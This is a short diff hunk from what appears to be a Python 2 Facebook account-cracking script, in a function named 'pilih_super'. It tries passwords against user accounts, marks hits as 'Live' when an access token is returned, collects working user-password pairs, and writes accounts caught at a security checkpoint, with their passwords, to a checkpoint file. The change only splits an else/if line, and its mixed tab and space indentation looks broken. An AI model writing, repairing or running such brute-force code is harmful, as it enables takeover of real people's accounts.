@@ -2326,7 +2326,8 @@ def pilih_super():
 																	if 'access_token' in e:
 																		print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass8
 																		oks.append(user+pass8)
-																	else:if 'www.facebook.com' in e["error_msg"]:
+																	else:
+                                    if 'www.facebook.com' in e["error_msg"]:
 																		print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass8
 																		cek = open("out/checkpoint.txt", "a")
 																		cek.write(user+"|"+pass8+"\n")
